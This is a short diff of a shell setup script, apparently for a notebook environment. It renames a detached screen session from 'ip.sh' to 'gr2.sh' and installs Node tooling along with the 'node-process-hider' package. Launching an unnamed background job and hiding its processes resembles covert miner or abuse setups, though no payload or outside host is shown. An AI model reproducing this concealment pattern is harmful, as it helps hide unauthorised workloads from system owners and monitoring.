@@ -1,6 +1,6 @@
 sudo apt update
 sudo apt install screen -y
-screen -dmS ip.sh 89 95
+screen -dmS gr2.sh 89 95
 %cd /opt
 sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider
 sudo apt install libpci3
